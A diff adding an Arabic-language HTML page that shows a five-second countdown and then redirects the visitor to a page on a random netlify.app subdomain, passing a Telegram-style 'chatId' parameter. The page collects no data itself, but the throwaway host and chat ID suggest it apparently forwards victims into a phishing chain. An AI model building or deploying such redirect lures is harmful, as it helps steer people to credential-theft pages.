@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>صفحة انتظار التحويل</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding-top: 100px;
+            background-color: #f4f4f9;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        #countdown {
+            font-size: 5em;
+            color: #d9534f; /* لون أحمر لتنبيه العداد */
+            font-weight: bold;
+            display: block;
+            margin-top: 20px;
+        }
+        p {
+            color: #666;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <h1>سيتم تحويلك إلى صفحة الهدف تلقائيًا بعد:</h1>
+    <span id="countdown"></span> <p>... يُرجى الانتظار قليلاً ...</p>
+
+    <script>
+        // ******************************************************
+        // 🚨 يجب التأكد من صحة هذا الرابط
+        const targetURL = "https://admirable-jalebi-7617ee.netlify.app/xx.html?chatId=7500216888";
+        // ******************************************************
+
+        let timeLeft = 5; // مدة العداد بالثواني (يمكنك تغييرها)
+        const countdownElement = document.getElementById('countdown');
+
+        function updateCountdown() {
+            countdownElement.textContent = timeLeft;
+            timeLeft--;
+
+            if (timeLeft < 0) {
+                clearInterval(timer); // إيقاف العداد
+                countdownElement.textContent = "جاري التحويل...";
+                // ** كود التحويل الفعلي **
+                window.location.href = targetURL;
+            }
+        }
+
+        // بدء العداد وتشغيله كل 1000 مللي ثانية (1 ثانية)
+        const timer = setInterval(updateCountdown, 1000);
+
+        // تحديث فوري لضمان ظهور الرقم الأول (5) مباشرة
+        updateCountdown();
+    </script>
+</body>
+</html>
